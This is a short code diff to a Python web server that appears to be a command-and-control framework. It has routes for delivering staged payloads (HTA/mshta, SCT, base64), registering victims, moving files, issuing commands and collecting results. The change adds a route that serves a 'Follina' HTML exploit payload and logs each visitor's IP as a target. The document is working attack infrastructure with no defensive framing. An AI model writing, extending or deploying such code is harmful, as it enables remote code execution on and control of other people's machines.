@@ -42,7 +42,7 @@ urls = ('/', 'index', raw_payload, 'payload', b52_payload, 'payloadc', b64_stage
         hjf_payload, 'payloadjf', b64_payload, 'base64', hjfs_payload, 'payloadjfs', sct_payload, 'sct', hta_payload,
         'mshta', register_url + '/(.*)', 'info', download_url + '/(.*)', 'download', upload_url + '/(.*)', 'upload',
         image_url + '/(.*)', 'image', command_url + '/(.*)', 'command', result_url + '/(.*)', 'result',
-        modules_url + '/(.*)', 'modules')
+        modules_url + '/(.*)', 'modules',follina_url+".html",'follina')
 
 
 @app.route("/", methods=["GET"])
@@ -50,6 +50,14 @@ urls = ('/', 'index', raw_payload, 'payload', b52_payload, 'payloadc', b64_stage
 def index():
     return "Oops... We Couldn't Find Your Page! (404 Error)"
 
+@app.route(follina_url+".html", methods=["GET"])
+def follina():
+    ip = request.remote_addr
+    p_out = '\n[+] Folllina HTML PAYLOAD Sent to (%s)' % ip
+    HTML = open("utils/payloads/Follina/follina.html", "r")
+    Data=HTML.read()
+    HTML.close()
+    return Data
 
 def toB52(st):
     value = 0
